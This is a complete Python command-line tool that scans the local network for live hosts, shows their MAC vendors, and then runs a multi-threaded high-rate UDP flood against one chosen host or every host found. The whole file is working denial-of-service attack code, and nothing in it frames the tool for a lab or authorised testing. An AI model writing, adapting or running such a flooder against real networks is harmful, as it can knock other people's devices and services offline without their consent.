#!/usr/bin/env python3
import argparse
import threading
import socket
import random
import sys
import time
import subprocess
import errno
from concurrent.futures import ThreadPoolExecutor, as_completed

from tqdm import tqdm
from manuf import manuf

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()

def ping_host(ip: str) -> bool:
    return subprocess.run(
        ["ping", "-c", "1", "-W", "1", ip],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    ).returncode == 0

def scan_lan() -> list[str]:
    local_ip = get_local_ip()
    if not local_ip:
        print("[-] Cannot determine local IP; check connectivity.")
        sys.exit(1)

    parts = local_ip.split(".")[:3]
    base = ".".join(parts) + "."
    ips = [base + str(i) for i in range(1, 255) if base + str(i) != local_ip]
    live = []
    with ThreadPoolExecutor(max_workers=100) as exe:
        futures = {exe.submit(ping_host, ip): ip for ip in ips}
        for f in tqdm(as_completed(futures),
                      total=len(ips),
                      desc="Scanning LAN",
                      unit="host"):
            if f.result():
                live.append(futures[f])
    return sorted(live, key=lambda ip: list(map(int, ip.split("."))))

def resolve_vendors(hosts: list[str]) -> list[tuple[str,str,str]]:
    proc = subprocess.run(["ip", "neigh"], capture_output=True, text=True)
    neigh = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 5 and parts[2] == "lladdr":
            neigh[parts[0]] = parts[4]
    parser = manuf.MacParser()
    results = []
    for ip in hosts:
        mac = neigh.get(ip, None)
        if not mac or mac.count(':') != 5:
            vendor = "Unknown"
        else:
            try:
                vendor = parser.get_manuf(mac) or "Unknown"
            except Exception:
                vendor = "Unknown"
        results.append((ip, mac or "n/a", vendor))
    return results

def probe_udp_port(ip: str, port: int, timeout: float = 1.0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b"\x00", (ip, port))
        try:
            sock.recvfrom(1024)
            return True
        except socket.timeout:
            return True
        except socket.error as e:
            return False if e.errno == errno.ECONNREFUSED else True
    finally:
        sock.close()

def pick_best_udp_port(ip: str) -> int:
    for p in [53,161,123,500,67,68]:
        print(f"[*] Probing UDP/{p}… ", end="", flush=True)
        if probe_udp_port(ip, p):
            print("open/filtered")
            return p
        print("closed")
    print("[!] None responded; defaulting to random ports (0).")
    return 0

def flood_thread(target_ip, port, size, deadline, counts_dict, key, tid, iface):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
        if iface:
            sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode()+b"\0")
    except:
        pass

    payload = random._urandom(size)
    rnd = random.randint
    dst = (target_ip, port)
    sent = 0
    while time.time() < deadline:
        for _ in range(64):
            try:
                if port == 0:
                    sock.sendto(payload, (target_ip, rnd(1,65535)))
                else:
                    sock.sendto(payload, dst)
                sent += 1
            except:
                pass
    counts_dict[key][tid] = sent

def main():
    parser = argparse.ArgumentParser(
        description="LAN scan → auto-UDP-port pick → high-rate UDP flood"
    )
    parser.add_argument("--packet-size", "-s", type=int, help="bytes per packet")
    parser.add_argument("--duration", "-d", type=int, help="flood duration (sec)")
    parser.add_argument("--threads", "-t", type=int, help="threads per target")
    parser.add_argument("--iface", "-i", default="", help="interface to bind")
    parser.add_argument("--autoport", action="store_true",
                        help="probe common UDP ports")
    args = parser.parse_args()

    # Scan and list hosts + vendors
    hosts = scan_lan()
    info = resolve_vendors(hosts)
    print("\nLive hosts:")
    for idx, (ip, mac, vendor) in enumerate(info, 1):
        print(f"  {idx:3d}) {ip:16s}  {mac}  {vendor}")
    print("    0) ALL hosts")

    # Select target(s)
    sel = input(f"Select target (0–{len(info)}): ").strip()
    if sel == "0":
        targets = [ip for ip, _, _ in info]
    else:
        i = int(sel) - 1
        targets = [info[i][0]]

    # Port selection
    if args.autoport and len(targets) == 1:
        port = pick_best_udp_port(targets[0])
    else:
        port = 0

    # Packet size / duration / threads
    if args.packet_size is None:
        args.packet_size = int(input("Packet size (bytes): ").strip())
    if args.duration is None:
        args.duration = int(input("Duration (sec): ").strip())
    if args.threads is None:
        args.threads = int(input("Threads per target: ").strip())
    iface = args.iface or None

    print(f"\n[*] Flooding {len(targets)} target(s) on UDP/{port} "
          f"size={args.packet_size} dur={args.duration}s "
          f"threads/target={args.threads} iface={iface or 'default'}\n")

    # Prepare counts
    counts = {ip: [0]*args.threads for ip in targets}
    deadline = time.time() + args.duration

    # Launch threads for each target
    for ip in targets:
        for tid in range(args.threads):
            threading.Thread(
                target=flood_thread,
                args=(ip, port, args.packet_size, deadline, counts, ip, tid, iface),
                daemon=True
            ).start()

    # Progress bar for duration
    for _ in tqdm(range(args.duration), desc="Flooding", unit="s"):
        time.sleep(1)

    # Summarize
    total = 0
    print("\n[*] Flood complete. Packets sent per target:")
    for ip, sent_list in counts.items():
        s = sum(sent_list)
        total += s
        print(f"  {ip:16s} → {s:,} packets")
    print(f"  Total across all targets: {total:,} packets")

if __name__ == "__main__":
    main()
